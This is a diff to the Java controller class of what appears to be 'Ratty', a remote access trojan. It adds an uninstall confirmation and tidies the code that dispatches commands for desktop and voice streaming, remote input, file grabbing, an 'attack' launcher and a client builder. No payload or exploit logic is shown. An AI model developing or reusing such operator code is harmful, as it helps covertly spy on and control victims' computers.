@@ -96,6 +96,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	};
 	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
+	private static final String UNINSTALL_WARNING = LANGUAGE.getString("server.uninstall_warning");
 	private static final String YES = LANGUAGE.getString("server.yes");
 	private static final String NO = LANGUAGE.getString("server.no");
 	private static final String CANCEL = LANGUAGE.getString("server.cancel");
@@ -144,7 +145,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 					ex.printStackTrace();
 				}
 			}
-		});
+		}, "Ping");
 		
 		clients = new HashMap<ActiveConnection, ServerClient>();
 		startTime = System.currentTimeMillis();
@@ -358,6 +359,18 @@ public final class RattyGuiController extends AbstractRattyController implements
 		return packet;
 	}
 	
+	private UninstallPacket createUninstallPacket() {
+		final boolean accepted = gui.showWarning(UNINSTALL_WARNING, YES, CANCEL);
+		
+		if (accepted) {
+			final UninstallPacket packet = new UninstallPacket();
+			
+			return packet;
+		}
+		
+		return null;
+	}
+	
 	private void toggleDesktopStream(final ServerClient client) {
 		final boolean streamingDesktop = client.isStreamingDesktop();
 		
@@ -453,14 +466,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 			toggleVoiceStream(client);
 		} else if (command == RattyGui.ATTACK) {
 			launchAttack();
-		} else if (command == RattyGui.BUILD) {
-			startBuilder();
 		} else if (command == FileTree.REQUEST) {
 			requestFile(client);
 		} else if (command == RattyGui.CHAT) {
 			client.chat.setVisible(true);
 		} else if (command == RattyGui.CLOSE) {
 			server.close();
+		} else if (command == RattyGui.BUILD) {
+			startBuilder();
 		}
 	}
 	
@@ -506,7 +519,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		} else if (command == RattyGui.INFORMATION) {
 			packet = new ComputerInfoPacket();
 		} else if (command == RattyGui.UNINSTALL) {
-			packet = new UninstallPacket();
+			packet = createUninstallPacket();
 		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastMouseEventPacket();
 		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
@@ -698,8 +711,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 			
 			return icon;
 		} catch (final IOException ex) {
-			ex.printStackTrace();
-			
 			return null;
 		}
 	}
@@ -773,14 +784,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 		client.removeListener(this);
 		client.setStreamingDesktop(false);
 		client.setStreamingVoice(false);
-		client.logOut();
 	}
 	
 	@Override
 	public void closed(final ActiveServer server) {
-		clients.values().forEach(ServerClient::logOut);
-		clients.clear();
-		
 		super.closed(server);
 		
 		System.exit(0);
@@ -788,7 +795,18 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	@Override
 	public void userInput(final String command, final Object source) {
-		final ServerClient client = (ServerClient)source;
+		final ServerClient client;
+		
+		if (source instanceof ServerClient) {
+			client = (ServerClient)source;
+		} else if (source instanceof IRattyGui) {
+			final IRattyGui gui = (IRattyGui)source;
+			
+			client = gui.getSelectedClient();
+		} else {
+			client = null;
+		}
+		
 		final IPacket packet = createPacket(client, command);
 		
 		if (packet != null) {
